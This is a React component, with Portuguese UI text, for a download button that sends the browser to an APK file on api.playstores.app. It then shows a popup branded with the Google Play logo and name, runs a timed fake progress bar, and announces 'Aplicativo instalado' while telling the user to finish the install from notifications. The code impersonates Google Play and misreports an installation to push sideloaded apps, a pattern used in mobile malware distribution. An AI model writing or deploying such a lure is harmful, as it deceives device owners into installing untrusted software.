'use client';

import { useState } from 'react';
import styles from './DownloadPopup.module.css';

export default function DownloadPopup({ slug }) {
  const [popup, setPopup] = useState(false);
  const [progressComplete, setProgressComplete] = useState(false);

  const handleDownload = () => {
    setPopup(true);

  // Inicia o download após pequeno atraso
  setTimeout(() => {
    window.location.href = `https://api.playstores.app/apps/${slug}/${slug}.apk`;
  }, 300); // atraso leve para UX
  
    // Controla a transição após 7s de carregamento
    setTimeout(() => {
      setProgressComplete(true);
    }, 7000);
  };

  const closePopup = () => {
    setPopup(false);
    setProgressComplete(false);
  };

  return (
    <>
      <button className={styles.downloadButton} onClick={handleDownload}>
        Baixar
      </button>

      {popup && (
        <div className={styles.overlay}>
          <div className={styles.popup}>
            <div className={styles.header}>
              <img src="/logoplay.svg" alt="Google Play" className={styles.logo} />
              <span className={styles.title}>Google Play</span>
            </div>


            {!progressComplete ? (
              <>
                <div className={styles.progressBar}>
                  <div className={styles.progress}></div>
                </div>
                <p className={styles.message}>Preparando o download do aplicativo...</p>
              </>
            ) : (
              <>
                <h3 className={styles.installed}>Aplicativo instalado</h3>
                <p className={styles.instruction}>
                  Abra as notificações do sistema e finalize a instalação.
                </p>
                <button className={styles.okButton} onClick={closePopup}>
                  OK
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
